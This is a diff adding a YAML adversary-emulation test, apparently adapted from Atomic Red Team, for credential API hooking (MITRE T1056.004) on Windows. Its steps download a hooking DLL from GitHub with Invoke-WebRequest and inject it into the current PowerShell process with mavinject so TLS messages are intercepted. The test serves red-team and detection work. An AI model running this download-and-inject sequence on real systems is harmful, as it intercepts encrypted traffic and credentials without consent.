@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: Hook PowerShell TLS Encrypt/Decrypt Messages
+description: |
+    Hooks functions in PowerShell to read TLS Communications
+args:
+    - name: file_name
+      type: path
+      default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
+    - name: server_name
+      type: string
+      default: https://www.example.com
+uuid: de1934ea-1fbf-425b-8795-65fb27dd7e33
+mitre:
+    tactics:
+        - 'TA0009: Collection'
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1056: Input Capture'
+    subtechniques:
+        - 'T1056.004: Credential API Hooking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        T1056.004x64.dll must exist on disk at specified location (#{file_name})
+      inline: |
+        if (Test-Path "#{file_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
+        }}
+      executor: powershell
+    - name: hook-powershell-tls-encrypt/decrypt-messages
+      inline: |
+        mavinject $pid /INJECTRUNNING "{{.Args.file_name}}"
+        Invoke-WebRequest {{.Args.server_name}} -UseBasicParsing
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
